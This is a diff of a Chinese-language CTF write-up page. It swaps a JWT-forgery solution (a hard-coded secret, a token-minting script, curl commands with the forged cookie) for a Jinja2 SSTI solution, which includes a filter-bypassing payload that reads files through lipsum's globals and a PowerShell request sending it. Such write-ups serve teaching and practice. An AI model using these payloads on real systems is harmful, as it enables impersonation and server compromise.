@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/Blue%20Hens%20CTF%202026/bawker/">
+        <link rel="canonical" href="https://gggongyizhen.github.io/AgentWP/CTF%40CIT%202026/Temporary%20Destruction/">
       
       
       
@@ -21,7 +21,7 @@
     
     
       
-        <title>bawker - My Docs</title>
+        <title>Temporary Destruction - My Docs</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#bawker" class="md-skip">
+        <a href="#temporary-destruction" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              bawker
+              Temporary Destruction
             
           </span>
         </div>
@@ -282,45 +282,6 @@
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="利用过程">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-jwt" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. 生成伪造 JWT
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-cookie" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. 带上 Cookie 访问站点
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. 本地复现结果
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
 </li>
       
         <li class="md-nav__item">
@@ -373,134 +334,90 @@
 
 
 
-<h1 id="bawker">bawker</h1>
+<h1 id="temporary-destruction">Temporary Destruction</h1>
 <h2 id="_1">题目信息</h2>
 <ul>
 <li>类型：Web</li>
-<li>题目状态：已定位完整利用链，远端实例需手动创建</li>
-<li>目标：<code>http://cdeployer1.2485370.xyz:8080/</code></li>
-<li>核心漏洞：硬编码 JWT 密钥导致可伪造 <code>admin</code> 身份</li>
+<li>题目状态：已解出</li>
+<li>目标：http://23.179.17.92:5558</li>
+<li>核心漏洞：Flask/Jinja2 SSTI，过滤器只拦截明文 <code>__dunder__</code>，可通过动态拼接属性名绕过，最终任意读取 <code>/tmp/flag.txt</code></li>
 </ul>
 <h2 id="_2">入口与现象</h2>
-<p>题目附件是一个 FastAPI 写的类 Twitter 站点。先看源码能很快锁定几个关键事实：</p>
-<ol>
-<li>认证 Cookie 名固定为 <code>bawker_token</code>。</li>
-<li>JWT 密钥写死在源码里，是 <code>fake_secret_key_for_testing_purposes_only</code>。</li>
-<li>后端把 JWT 的 <code>sub</code> 直接当用户 ID 使用。</li>
-<li>数据库启动时会强制创建 <code>id=0</code> 的 <code>admin</code> 私密用户，并插入一条私密 bawk，内容里直接带 flag。</li>
-</ol>
-<p>对应代码位置：</p>
-<pre><code class="language-python"># app/config.py
-AUTH_COOKIE_NAME = &quot;bawker_token&quot;
-JWT_SECRET_KEY = &quot;fake_secret_key_for_testing_purposes_only&quot;
-FLAG_VALUE = &quot;CTF{fake_flag_for_testing_purposes_only}&quot;
-</code></pre>
-<pre><code class="language-python"># app/security.py
-payload = {&quot;sub&quot;: subject, &quot;exp&quot;: expire_at}
-...
-payload = jwt.decode(token, settings.jwt_secret_key, algorithms=[JWT_ALGORITHM])
-subject = payload.get(&quot;sub&quot;)
-</code></pre>
-<pre><code class="language-python"># app/db.py
-admin = User(
-    id=0,
-    username=&quot;admin&quot;,
-    ...
-    is_private=True,
-)
+<p>题目首页只有一个输入框，提交后服务端会把输入内容“处理”后回显出来。附件里给了完整源码，优先直接看 <code>app.py</code>：</p>
+<pre><code class="language-python">if request.method == 'POST':
+    raw_input = request.form.get('user_input', '')
 
-flag_post_content = f&quot;Hello, the flag is: {FLAG_VALUE}&quot;
-flag_post = Bawk(
-    author_id=0,
-    content=flag_post_content,
-    is_private=True,
-)
+    if BLOCKED.search(raw_input):
+        output = 'rejected.'
+        is_error = True
+    else:
+        try:
+            output = render_template_string(raw_input)
+        except Exception:
+            output = 'error.'
+            is_error = True
 </code></pre>
-<p>这意味着只要能用已知密钥签一个 <code>sub=0</code> 的 JWT，后端就会把我们当成 <code>admin</code>。</p>
+<p>这里最关键的是 <code>render_template_string(raw_input)</code>。用户输入被直接当成 Jinja2 模板渲染，已经是标准 SSTI。</p>
+<p>题目做的唯一限制是：</p>
+<pre><code class="language-python">BLOCKED = re.compile(r'__\w+__')
+</code></pre>
+<p>也就是说，只要输入里出现明文形态的 <code>__class__</code>、<code>__globals__</code>、<code>__builtins__</code> 这类双下划线属性，就会被拦掉。</p>
+<p>先用最小 payload 验证模板执行：</p>
+<pre><code class="language-text">{{7*7}}
+</code></pre>
+<p>页面返回 <code>49</code>，说明 SSTI 可以稳定触发。</p>
 <h2 id="_3">分析过程</h2>
-<p>整个认证流程非常直接：</p>
+<p>这题的难点不在找漏洞，而在绕过这个很弱的正则过滤。</p>
+<p>过滤器检查的是原始输入文本里是否出现 <code>__\w+__</code>，所以只要不把双下划线属性名直接写出来，而是在模板运行时再动态拼接，就不会命中过滤规则。例如：</p>
+<pre><code class="language-jinja2">['_','_','globals','_','_']|join
+</code></pre>
+<p>这段表达式最终会得到字符串 <code>__globals__</code>，但原始输入里并没有连续的 <code>__globals__</code> 字样，因此可以通过正则检查。</p>
+<p>接下来要找一个可用的对象作为跳板。Jinja2 模板里默认存在 <code>lipsum</code> 这个函数对象，它带有 <code>__globals__</code>，所以可以一路取到内建对象，再直接调用 <code>open()</code> 读文件：</p>
+<pre><code class="language-jinja2">{{ lipsum
+  |attr(['_','_','globals','_','_']|join)
+  |attr('get')(['_','_','builtins','_','_']|join)
+  |attr('get')('open')('/tmp/flag.txt')
+  |attr('read')()
+}}
+</code></pre>
+<p>这条链的思路是：</p>
 <ol>
-<li>登录成功后，服务端调用 <code>create_access_token(str(user.id))</code>。</li>
-<li>这个 token 被写进 <code>bawker_token</code> Cookie。</li>
-<li>后续请求里，<code>get_current_user_optional()</code> 会从 Cookie 读出 token。</li>
-<li><code>decode_access_token()</code> 只验证签名和 <code>exp</code>，然后取出 <code>sub</code>。</li>
-<li><code>sub</code> 被转成整数后直接 <code>session.get(User, user_id)</code>。</li>
+<li>用 <code>lipsum.__globals__</code> 拿到函数全局字典。</li>
+<li>从里面取出 <code>__builtins__</code>。</li>
+<li>再取出 <code>open</code>。</li>
+<li>直接读取 <code>/tmp/flag.txt</code>。</li>
 </ol>
-<p>也就是说，后端没有做任何额外的服务端会话校验，也没有限制 <code>sub</code> 不能是 <code>0</code>。而 <code>admin</code> 用户恰好又是固定 <code>id=0</code>。</p>
-<p>这题的利用链因此非常短：</p>
-<ol>
-<li>用源码里的固定密钥签 JWT。</li>
-<li>把 <code>sub</code> 设为 <code>"0"</code>。</li>
-<li>将生成的 token 放进 <code>bawker_token</code> Cookie。</li>
-<li>访问首页 <code>/</code>，即可看到 <code>admin</code> 的私密 bawk，也就是 flag。</li>
-</ol>
+<p>附件里的 <code>Dockerfile</code> 也证实了 flag 路径：</p>
+<pre><code class="language-dockerfile">RUN echo -n &quot;CIT{test_flag}&quot; &gt; /tmp/flag.txt &amp;&amp; \
+    chmod 444 /tmp/flag.txt
+</code></pre>
+<p>因此不需要再走 <code>os.popen</code> 或命令执行，任意文件读就已经足够拿 flag。</p>
 <h2 id="_4">利用过程</h2>
-<h3 id="1-jwt">1. 生成伪造 JWT</h3>
-<pre><code class="language-python">import jwt
-from datetime import datetime, timedelta, timezone
-
-token = jwt.encode(
-    {
-        &quot;sub&quot;: &quot;0&quot;,
-        &quot;exp&quot;: datetime.now(timezone.utc) + timedelta(minutes=90),
-    },
-    &quot;fake_secret_key_for_testing_purposes_only&quot;,
-    algorithm=&quot;HS256&quot;,
-)
-
-print(token)
+<ol>
+<li>打开首页，确认页面会把提交结果回显到下方。</li>
+<li>结合附件源码，发现后端直接执行 <code>render_template_string(raw_input)</code>，确定是 Jinja2 SSTI。</li>
+<li>用 <code>{{7*7}}</code> 验证模板表达式会被执行。</li>
+<li>发现服务端只过滤明文 <code>__\w+__</code>，于是把危险属性名改成 <code>['_','_','globals','_','_']|join</code> 这种运行时拼接形式。</li>
+<li>通过 <code>lipsum -&gt; __globals__ -&gt; __builtins__ -&gt; open('/tmp/flag.txt').read()</code> 直接读取 flag 文件。</li>
+</ol>
+<p>线上返回结果如下：</p>
+<pre><code class="language-text">CIT{55T1_R3m0t3_C0d3_3x3cut1on}
 </code></pre>
-<h3 id="2-cookie">2. 带上 Cookie 访问站点</h3>
-<p>如果已经拿到实际实例地址，直接把 token 放到 <code>bawker_token</code> 里访问即可：</p>
-<pre><code class="language-bash">curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/
-curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/api/auth/me
-</code></pre>
-<p><code>/api/auth/me</code> 会直接确认当前身份是不是 <code>admin</code>。</p>
-<h3 id="3">3. 本地复现结果</h3>
-<p>我根据附件在本地做了完整复现，结果如下：</p>
-<pre><code class="language-text">feed_anon 200 contains_flag False
-register 303 set_cookie True
-me_after_register 200 {'authenticated': True, 'user': {'id': 1, 'username': 'attacker', ...}}
-me_admin 200 {'authenticated': True, 'user': {'id': 0, 'username': 'admin', ...}}
-feed_admin 200 contains_flag True
-Hello, the flag is: CTF{fake_flag_for_testing_purposes_only}
-</code></pre>
-<p>这说明利用链是完整可用的，不是停留在静态猜测。</p>
 <h2 id="payload">关键 payload / 命令</h2>
-<pre><code class="language-text">Cookie: bawker_token=&lt;HS256({&quot;sub&quot;:&quot;0&quot;,&quot;exp&quot;:...}, &quot;fake_secret_key_for_testing_purposes_only&quot;)&gt;
-</code></pre>
-<p>生成 token：</p>
-<pre><code class="language-python">import jwt
-from datetime import datetime, timedelta, timezone
+<pre><code class="language-powershell">$body = @{
+  user_input = &quot;{{ lipsum|attr(['_','_','globals','_','_']|join)|attr('get')(['_','_','builtins','_','_']|join)|attr('get')('open')('/tmp/flag.txt')|attr('read')() }}&quot;
+}
 
-print(jwt.encode(
-    {&quot;sub&quot;: &quot;0&quot;, &quot;exp&quot;: datetime.now(timezone.utc) + timedelta(minutes=90)},
-    &quot;fake_secret_key_for_testing_purposes_only&quot;,
-    algorithm=&quot;HS256&quot;,
-))
+Invoke-WebRequest -UseBasicParsing 'http://23.179.17.92:5558/' -Method POST -Body $body
 </code></pre>
-<p>验证身份：</p>
-<pre><code class="language-bash">curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/api/auth/me
-</code></pre>
-<p>读取首页私密 bawk：</p>
-<pre><code class="language-bash">curl -b &quot;bawker_token=REPLACE_WITH_TOKEN&quot; http://INSTANCE_HOST/
+<p>核心 payload 单独拎出来就是：</p>
+<pre><code class="language-jinja2">{{ lipsum|attr(['_','_','globals','_','_']|join)|attr('get')(['_','_','builtins','_','_']|join)|attr('get')('open')('/tmp/flag.txt')|attr('read')() }}
 </code></pre>
 <h2 id="flag">Flag</h2>
-<pre><code class="language-text">附件内占位 flag：CTF{fake_flag_for_testing_purposes_only}
+<pre><code class="language-text">CIT{55T1_R3m0t3_C0d3_3x3cut1on}
 </code></pre>
-<p>2026-04-18 实测时，题目给出的地址实际上是一个 Challenge Instancer 首页，不是已经启动好的 <code>bawker</code> 实例，而且创建实例前需要通过 Cloudflare Turnstile。未带 Turnstile 参数直接提交会返回：</p>
-<pre><code class="language-text">Turnstile verification failed. Are you a bot?
-</code></pre>
-<p>所以自动化分析阶段没法直接取到远端真实 flag，但真实实例一旦创建出来，利用方式不会变化，直接把上面的 JWT 塞进 <code>bawker_token</code> 即可。</p>
 <h2 id="_5">总结</h2>
-<p>这题本质上是一个非常直接的 JWT 伪造题：</p>
-<ul>
-<li>JWT 密钥硬编码在源码里。</li>
-<li>JWT 的 <code>sub</code> 被直接信任为用户 ID。</li>
-<li><code>admin</code> 用户固定是 <code>id=0</code>。</li>
-<li>flag 就放在 <code>admin</code> 的私密 bawk 里。</li>
-</ul>
-<p>因此不需要爆破密码、不需要关注私密账号关注逻辑，直接伪造 <code>sub=0</code> 的 token 就结束了。</p>
+<p>这题本质上是一个非常直接的 Jinja2 SSTI，只是额外套了一层“禁止出现明文双下划线属性”的伪过滤。真正的突破点在于意识到过滤发生在模板渲染前，所以可以把 <code>__globals__</code>、<code>__builtins__</code> 这类敏感属性改成运行时动态拼接，最终从模板上下文一路拿到 <code>open()</code>，直接把 <code>/tmp/flag.txt</code> 读出来。</p>
 
 
 
